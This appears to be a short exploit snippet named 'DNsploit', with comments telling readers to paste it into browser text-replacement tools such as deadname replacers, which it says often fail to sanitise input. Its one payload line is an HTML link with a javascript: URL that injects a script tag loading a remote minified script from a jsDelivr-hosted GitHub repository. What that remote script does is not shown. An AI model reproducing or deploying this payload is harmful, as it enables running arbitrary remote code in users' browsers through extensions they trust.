// Copy this into a deadname replacer, or really anything that replaces text with text.
// Uses the fact that most of these do not sanitize inputs
// Some do not support scripts, so we insert a javascript hyperlink

<a href="javascript:(function () {var v = document.createElement('script');v.src = 'https://cdn.jsdelivr.net/gh/NicePotato-MS/PotatoBookmarklet@main/script.min.js';document.body.appendChild(v);}())">Click me to execute DNsploit</a>